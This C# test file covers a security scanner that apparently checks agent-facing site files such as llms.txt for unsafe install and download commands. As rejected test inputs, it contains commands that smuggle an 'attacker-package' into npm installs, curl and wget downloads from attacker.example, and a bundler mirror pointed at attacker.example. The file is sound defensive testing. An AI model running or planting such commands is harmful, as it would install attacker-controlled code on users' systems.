using PowerForge.Web;

namespace PowerForge.Tests;

public sealed partial class WebAgentContentSecurityScannerTests
{
    [Theory]
    [InlineData("printf 'attacker-package\\n' | xargs npm install safe-package@1.0.0")]
    [InlineData("printf 'attacker-package\\n' | xargs -n1 npm install safe-package@1.0.0")]
    [InlineData("printf 'attacker-package\\n' | /usr/bin/xargs npm install safe-package@1.0.0")]
    [InlineData("printf 'attacker-package\\n' | gxargs npm install safe-package@1.0.0")]
    [InlineData("parallel npm install safe-package@1.0.0 ::: attacker-package")]
    [InlineData("find packages -exec npm install safe-package@1.0.0 {} +")]
    public void Scan_RejectsDataAppendingPackageWrappers(string command)
    {
        AssertWave34FailureWithoutRegistry(command, "PFAGENT.PACKAGE.UNVERIFIABLE_OPERAND");
    }

    [Theory]
    [InlineData("cargo --offline install safe-crate@1.0.0")]
    [InlineData("cargo install --offline safe-crate@1.0.0")]
    [InlineData("cargo --frozen add safe-crate@1.0.0")]
    [InlineData("cargo install safe-crate@1.0.0 --frozen")]
    [InlineData("CARGO_NET_OFFLINE=true cargo install safe-crate@1.0.0")]
    public void Scan_RejectsCargoLocalCacheModes(string command)
    {
        AssertWave34FailureWithoutRegistry(command, command.StartsWith("CARGO_", StringComparison.Ordinal)
            ? "PFAGENT.PACKAGE.UNTRUSTED_SOURCE"
            : "PFAGENT.PACKAGE.UNVERIFIABLE_OPERAND");
    }

    [Theory]
    [InlineData("python -m pip install safe-package==1.0.0")]
    [InlineData("python -m pipx run safe-package==1.0.0")]
    [InlineData("py -3 -m pip.__main__ install safe-package==1.0.0")]
    public void Scan_RejectsUnsafePythonModuleLookup(string command)
    {
        AssertWave34FailureWithoutRegistry(command, "PFAGENT.PACKAGE.UNVERIFIABLE_OPERAND");
    }

    [Theory]
    [InlineData("wget --content-disposition https://attacker.example/download")]
    [InlineData("wget --trust-server-names https://attacker.example/download")]
    [InlineData("curl -O -J https://attacker.example/download")]
    [InlineData("curl -fsSLJO https://attacker.example/download")]
    [InlineData("curl --remote-name --remote-header-name https://attacker.example/download")]
    public void Scan_RejectsServerSelectedDownloadNames(string command)
    {
        using var scanner = new WebAgentContentSecurityScanner();
        var root = CreateArtifact("llms.txt", command);
        try
        {
            var result = scanner.Scan(new WebAgentContentSecurityOptions
            {
                SiteRoot = root,
                Files = ["llms.txt"],
                VerifyPackages = false,
                VerifyExternalHosts = false
            });
            Assert.False(result.Success);
            Assert.Contains(result.Findings, finding => finding.Code == "PFAGENT.COMMAND.REMOTE_EXECUTION");
        }
        finally
        {
            TryDeleteDirectory(root);
        }
    }

    [Fact]
    public void Scan_VerifiesBundlerLauncherAlias()
    {
        using var handler = new RegistryHandler(_ => JsonResponse("""{"version":"1.0.0"}"""));
        using var scanner = new WebAgentContentSecurityScanner(new HttpClient(handler));
        var root = CreateArtifact("llms.txt", "bundler add safe-gem --version 1.0.0");
        try
        {
            var result = scanner.Scan(new WebAgentContentSecurityOptions { SiteRoot = root, Files = ["llms.txt"] });
            Assert.True(result.Success, string.Join(" | ", result.Findings.Select(static finding => finding.Message)));
            Assert.Equal(1, result.VerifiedPackageCount);
            Assert.Equal(1, handler.RequestCount);
        }
        finally
        {
            TryDeleteDirectory(root);
        }
    }

    [Theory]
    [InlineData("bundler install", "PFAGENT.PACKAGE.UNVERIFIABLE_OPERAND")]
    [InlineData("bundler config mirror.https://rubygems.org https://attacker.example", "PFAGENT.PACKAGE.UNTRUSTED_SOURCE")]
    public void Scan_AppliesBundleSafetyContractToBundlerAlias(string command, string code)
    {
        AssertWave34FailureWithoutRegistry(command, code);
    }

    private static void AssertWave34FailureWithoutRegistry(string command, string code)
    {
        using var handler = new RegistryHandler(_ => throw new InvalidOperationException("Registry must not be called."));
        using var scanner = new WebAgentContentSecurityScanner(new HttpClient(handler));
        var root = CreateArtifact("llms.txt", command);
        try
        {
            var result = scanner.Scan(new WebAgentContentSecurityOptions { SiteRoot = root, Files = ["llms.txt"] });
            Assert.False(result.Success);
            Assert.Contains(result.Findings, finding => finding.Code == code);
            Assert.Equal(0, handler.RequestCount);
        }
        finally
        {
            TryDeleteDirectory(root);
        }
    }
}
